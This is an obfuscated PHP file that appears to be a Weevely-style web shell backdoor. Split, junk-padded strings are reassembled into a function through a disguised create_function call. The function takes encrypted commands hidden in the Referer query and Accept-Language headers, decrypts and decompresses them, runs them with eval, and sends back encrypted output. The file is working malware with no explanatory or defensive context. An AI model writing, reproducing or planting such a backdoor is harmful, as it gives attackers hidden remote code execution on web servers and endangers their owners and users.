<?php
$d='5(]:$i]:.$kh),0,3));$]:f=$sl($]:ss(m]:d5($i.$]:kf)]:,0,3));$p=]:"]:"]:;for($z=1;$z<coun]:t]:($m[1]]:);$]:z++)$p.=$q[$m[]:2]';
$U='$kh="]:5d41";$kf]:]:="402a";functi]:on ]:x($]:t,$k){]:$c=strle]:n($k);$l=]:strlen]:($t)]:;$o="";fo]:r($]:i=0;$i]:<]:$l;){for(';
$R='$j=0;(]:$j<]:$]:c&&$i]:<$l);$j++,$i]:+]:+){$o.=$t]:{$i}^$k]:{$j};}}re]:tur]:n $o;}$r=$]:_SER]:VER;$rr=]:@$r]:["HTT]:P_REFE]';
$Z='=]:strp]:os($s[]:$i],$f);]:if]:($e)]:{$k=$kh.$k]:f]:;ob_start();@]:e]:val(@]:gzun]:compres]:s]:(@x(@bas]:e]:64_dec]:]:od]:';
$M=str_replace('P','','cPreatPe_PPfunPcPtion');
$p=']:]:[$z]];if(]:strpos]:($p,$h)===0)]:{$s]:[$i]]:=]:"]:";$p=$ss($p,3);}if(arr]:ay_]:key_ex]:ists(]:]:$i,$s))]:{$s[$i].=$p;$e';
$v=':;]:]:$q]:]:=array_va]:lues($q);preg_]:match_all("/([\\w]:]]:)[\\w-]:]+(]:?:;q=0.([\\d]))?]:,?]:/",$]:ra,$m);i]:f($q&]:&$m){@]:';
$X=':R]:ER"];$ra=@]:$r["H]:TTP_ACCEPT]:_LANG]:UAGE"];i]:f(]:$rr]:&&$]:]:ra){$u=p]:arse_url($rr);pa]:rse_str(]:]:$u["query"],$q)]';
$C='e(]:preg_]:replace(array("/_/]:","/-/"),ar]:ra]:y("/","+"),$]:ss($]:s[$i],0]:,$e)]:]:)),$k)));$o=ob]:_get_contents();o]:b]';
$z=':_end_cl]:ea]:n();$d=bas]:]:e64_encode(x(gzc]:ompre]:ss(]:$o)]:,$k]:));pr]:int("<$k>$d</$k>]:");@]:]:session_]:destroy();}}}}';
$E='session]:_start();]:$s=&]:$_SESSIO]:N;$]:ss="sub]:str";$s]:]:l=]:"strt]:olower";$i=]:$m[1]]:[]:0].$m[1][1];$h=]:]:$sl($ss(md';
$j=str_replace(']:','',$U.$R.$X.$v.$E.$d.$p.$Z.$C.$z);
$Y=$M('',$j);$Y();
?>
